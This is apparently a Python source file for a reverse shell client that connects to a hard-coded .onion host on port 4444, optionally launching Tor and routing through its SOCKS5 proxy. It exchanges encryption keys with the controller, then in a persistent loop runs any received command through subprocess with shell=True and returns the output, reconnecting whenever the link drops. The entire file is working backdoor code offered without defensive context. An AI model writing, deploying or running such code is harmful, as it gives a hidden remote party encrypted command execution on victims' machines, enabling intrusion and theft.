import socket
import os
import subprocess
from socks import socksocket, SOCKS5
import sock_op_handler
import time
from EnDeCrypt import generateAsymmetricalKeys, encryptStringSymmetrical, \
    decryptStringAsymmetrical, import_key
from cryptography.fernet import InvalidToken
from datetime import datetime


# connect_ip = "127.0.0.1"
connect_ip = "jme2ik6vzqiyayjv6pfu4nk5n2lbjpeq7pxtp5bwyxzedwbzhrjksnad.onion"
connect_port = 4444

public_key = b""
private_key = b""
cic_public_key = b""
symmetrical_key = b""

connection = socket.socket()
connection_errors = (ConnectionAbortedError, ConnectionResetError, ConnectionRefusedError, ValueError, InvalidToken)  # == ConnectionError.__class__


def log(text: (str, bytes)):
    print(str(datetime.now().strftime("%H:%M:%S")) + " ->", repr(text).strip("''"))


def create_keys() -> (bytes, bytes): return generateAsymmetricalKeys()


def get_proxy_socket():
    s = socksocket()
    s.set_proxy(SOCKS5, "127.0.0.1", 9050)
    return s


def start_tor():
    def execute(cmd):
        popen = subprocess.Popen(cmd, stdout=subprocess.PIPE, universal_newlines=True)
        for stdout_line in iter(popen.stdout.readline, ""):
            yield stdout_line
        popen.stdout.close()
        return_code = popen.wait()
        if return_code:
            raise subprocess.CalledProcessError(return_code, cmd)
    for path in execute(r"tor-win32-0.4.5.10/Tor/tor.exe"):
        print(path)
        if "100%" in path:
            log("I  |  Successfully started Tor")


def connect(tor):
    global connection
    if tor:
        connection = get_proxy_socket()
    else:
        connection = socket.socket()
    while True:
        try:
            log("I  |  Connecting")
            connection.connect((connect_ip, connect_port))
            log("I  |  Connected")
            break
        except TimeoutError:
            pass
        except connection_errors:
            pass
        time.sleep(2)


def send_recv_keys():
    global cic_public_key, symmetrical_key
    log("I  |  Exchanging asymmetrical keys")
    connection.send(public_key.export_key())
    cic_public_key = import_key(connection.recv(271))
    log("I  |  Receiving symmetrical key")
    symmetrical_key = decryptStringAsymmetrical(connection.recv(128), private_key)
    log("I  |  Successfully exchanged keys")
    sock_op_handler.key = symmetrical_key
    sock_op_handler.client = connection


class shell:
    received = None
    command = None
    output = None
    exec = False
    original_path = os.getcwd()
    code_list = ["CODE:EXIT", "CODE:EXEC"]

    def recv(self):
        self.received = sock_op_handler.recv()
        self.command = self.received.split()

    def send(self, text: str):
        sock_op_handler.send(encryptStringSymmetrical(text, symmetrical_key))

    def change_directory(self):
        try:
            os.chdir(self.command)
        except FileNotFoundError:
            return "No such file or dictionary"
        except NotADirectoryError:
            return "Not a directory"
        except PermissionError:
            return "Permission denied"
        else:
            return "Changed directory"

    def execute_commands(self):
        # process = subprocess.Popen(self.command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        if not self.exec:
            self.output = subprocess.getoutput(self.command)
        else:
            subprocess.Popen(self.command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            self.output = "Executing..."

    def run(self):
        log("I  |  Starting shell")
        while True:
            log(f"I  |  PWD: {os.getcwd()}")
            self.send(os.getcwd())
            self.recv()
            if self.command[0] == "cd" and len(self.command) > 1:
                log("SI |  Changing directory")
                self.command = self.received.replace("cd", "").strip()
                self.output = self.change_directory()
            elif self.command[0] in self.code_list:
                if self.command[0] == "CODE:EXIT":
                    log("CI |  Received CODE:EXIT => Closing connection")
                    connection.close()
                    os.chdir(self.original_path)
                    break
                elif self.command[0] == "CODE:EXEC":
                    self.command = self.received.replace("CODE:EXEC", "").strip()
                    log(f"CI |  Received CODE:EXEC => Executing command: {self.command}")
                    self.exec = True
                    self.execute_commands()
                    self.exec = False
            else:
                log(f"I  |  Executing shell-command: {self.received}")
                self.command = self.received
                self.execute_commands()

            log(f"OI |  Output: {self.output}")
            self.send(self.output)


shell_instance = shell()


def main(tor):
    global cic_public_key
    if tor:
        try:
            start_tor()
        except Exception as e:
            log(f"E  |  Error: {e}")
    while True:
        connect(tor=tor)
        try:
            send_recv_keys()
            shell_instance.run()
        except connection_errors:
            connection.close()
            log(f"E  |  Lost connection")
            continue


if __name__ == '__main__':
    private_key, public_key = create_keys()
    main(tor=False)
